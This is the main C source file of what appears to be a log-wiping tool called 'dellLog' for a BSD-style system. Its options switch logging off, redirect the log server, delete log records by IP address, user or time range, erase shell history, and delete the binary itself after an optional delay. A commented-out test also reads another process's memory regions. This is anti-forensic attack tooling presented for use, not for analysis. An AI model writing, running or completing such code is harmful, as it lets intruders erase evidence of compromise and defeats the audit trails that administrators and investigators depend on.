


#include "utils.h"

#include "kvm.h"

#include "mem.h"

#include "cli.h"

//gcc -w -static ./dellLog.c -o ./dellLog -lkvm |more

/*
int test(int argc,char ** argv){
	
	struct proc processinfo;
	pid_t pid = (pid_t) atoi(argv[1]);
	
	get_proc_vm_regions(pid);
	get_proc_by_pid_kvmprocs(pid,&processinfo);
	find_proc_by_pid(pid,&processinfo);
	
	return 0;
}
*/



//#define MY_TEST_INTERFACE

int main (int argc,char ** argv){

	int ret = 0;
	
#ifdef MY_TEST_INTERFACE
	int privilige = check_securelevel();
	printf("priv:%d\r\n",privilige);
	
	if(argc < 2){
		printf("usage:%s pid\r\n",argv[0]);
		return 0;
	}
	pid_t pid = (pid_t)atoi(argv[1]);
	printf("pid:%d\r\n",pid);
	writeProcesData((pid_t)pid,(char*)argv[0],(char*)argv[0]);
	printf("%s ok\r\n",__FUNCTION__);
	return 0;
#endif
	
	int ch = 0;
	
	int delay_second = 0;
	
	char * del_arg = 0;
	
	while ((ch = getopt(argc, argv, "rd::ecos:p:t:h:")) != -1)
	{
        printf("optind: %d\n", optind);
        switch (ch) 
        {
			case 'c':
			{
				printf("close log\r\n");
				ret = SetLogOff();
				break;
			}
			/*
			case 'e':
			{
				printf("erase log\r\n");
				ret = EraseLog();
				break;
			}
			*/
			case 'o':
			{
				printf("open log\r\n");
				ret = SetLogOn();
				break;
			}
			case 's':
			{
				char * server = optarg;
				printf("server: %s\n", server);
				ret = SetLogServer(server);
				break;
			}
			case 'd':
			{	
				del_arg = optarg;
				printf("delete logging with arg:%s\r\n",del_arg);
				ret = isIPAddr(del_arg);
				if(ret){
					//DeleteAddr(del_arg);
				}
				else{
					//DeleteUser(del_arg);
				}

				break;
			}
			case 'r':
			{
				DeleteSelf();
				break;
			}
			case 'h':
			{
				char * param = optarg;
				DeleteHistory(param);
				break;
			}
			case 't':
			{
				char * param = optarg;
				char * sep = strstr(param,"-");
				if(sep){
					char start[256]={0};
					char stop[256]={0};
					memcpy(start,param,sep - param);
					strcpy(stop,sep + 1);
					time_t begin = strtoul(start,0,10);
					time_t end = strtoul(stop,0,10);
					ret = DeleteDateTime(begin,end);
				}
				
				break;
			}
			case 'p':
			{
				char * param = optarg;
				int delay = atoi(param);
				if(delay > 0){
					delay_second = delay;
				}
				break;
			}
			default:
			{
				break;
			}
		}	
	}
	
	sleep(delay_second);
	
	if(del_arg){
		ret = isIPAddr(del_arg);
		if(ret){
			DeleteAddr(del_arg);
		}
		else{
			DeleteUser(del_arg);
		}	
	}
	
	return ret;
}
